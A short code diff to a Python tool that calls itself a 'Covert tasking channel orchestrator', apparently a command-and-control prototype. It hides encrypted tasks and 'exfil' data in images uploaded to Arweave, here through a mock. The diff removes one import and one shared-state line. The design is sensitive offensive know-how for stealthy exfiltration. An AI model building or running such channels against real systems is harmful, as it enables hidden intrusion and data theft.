@@ -28,7 +28,7 @@ from src.assembler import OPCODE_TABLE, assemble_payload
 from src.crypto_wrapper import encrypt_task, decrypt_task
 from src.stego import embed, extract
 from src.vm import execute_bytecode
-from src.arweave_interface import MockArweave, download_image, get_wallet_transactions, get_latest_image_txid
+from src.arweave_interface import MockArweave, download_image, get_wallet_transactions
 
 #Creates the CLI using argparse
 parser = argparse.ArgumentParser(prog="MAIN", description="Covert tasking channel orchestrator")
@@ -183,8 +183,6 @@ def run_agent(args):
         txid = shared_state["mock"].upload_image("agent_wallet", exfil_stego_path)
         logger.info("Exfil handler step C, exfil data uploading finished")
 
-        #Update shared state
-        shared_state["new_exfil_ratchet"] = new_exfil_ratchet
         return txid
     
     #Acquire the reply image: bootstrap fetch or wallet watch
